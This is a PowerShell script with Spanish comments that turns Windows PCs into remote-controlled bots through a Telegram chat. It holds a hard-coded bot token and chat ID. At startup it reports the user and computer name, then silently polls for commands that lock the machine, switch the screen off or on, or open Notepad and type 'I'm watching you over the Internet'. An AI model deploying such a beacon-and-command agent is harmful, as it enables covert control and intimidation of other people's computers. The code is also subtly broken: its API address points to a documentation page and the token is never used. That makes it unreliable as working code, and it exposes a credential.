# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM (Pon tus datos aquí)
# ==============================================================================
$Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg"
$ChatID = "1018796719"

$URL    = "https://core.telegram.org/bots/api"
$MiPC   = $env:COMPUTERNAME
$User   = $env:USERNAME

# Registrar APIs de pantalla de Windows de forma segura
try {
    $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
    Add-Type -MemberDefinition $MethodDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
} catch {}

# --- NOTIFICAR A TELEGRAM QUE LA PC SE ENCENDIÓ ---
try {
    $MensajeInicio = "🚀 *PC En Línea:* `"$User@$MiPC`""
    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $MensajeInicio; parse_mode = "Markdown" })
} catch {}

# Variable interna para rastrear mensajes y no repetir órdenes viejas
$LastUpdateID = 0

# ==============================================================================
# BUCLE PRINCIPAL (Monitoreo de internet constante)
# ==============================================================================
while ($true) {
    try {
        # Consultar la API de Telegram con técnica de Long Polling para menor consumo de datos
        $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
        
        foreach ($Update in $Updates.result) {
            $LastUpdateID = $Update.update_id + 1
            $TextoRecibido = $Update.message.text
            $RemitenteChatID = $Update.message.chat.id

            # REQUISITO DE SEGURIDAD ABSOLUTO: Solo obedece si el ID coincide exactamente con el tuyo
            if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                
                # Descomponer el mensaje enviado (ejemplo: /pantalla_off PC-JOEL)
                $Partes = $TextoRecibido -split " "
                $Comando = $Partes[0].ToLower()
                $Destino = if ($Partes.Count -gt 1) { $Partes[1].ToUpper() } else { "TODOS" }

                # Filtrar si la orden va dirigida a este equipo en específico o a la red global
                if ($Destino -eq $MiPC.ToUpper() -or $Destino -eq "TODOS") {
                    
                    switch ($Comando) {
                        "/pantalla_off" {
                            $rundll = New-Object -ComObject WScript.Shell
                            $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
                            [Win32.Win32Utils]::SendMessage(-1, 0x0112, 0xF170, 2)
                            
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "✅ Pantalla apagada en $MiPC" })
                        }
                        "/pantalla_on" {
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("{SHIFT}")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "✅ Pantalla encendida en $MiPC" })
                        }
                        "/notepad" {
                            notepad.exe
                            Start-Sleep -Milliseconds 500
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("Te estoy observando por Internet... 👀")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "✅ Bloc de notas abierto en $MiPC" })
                        }
                        "/lista" {
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "👋 Reportándose desde Internet: $User@$MiPC" })
                        }
                    }
                }
            }
        }
    } catch {
        # En caso de desconexión o parpadeo del internet, espera pacientemente en silencio
    }
    Start-Sleep -Seconds 2
}
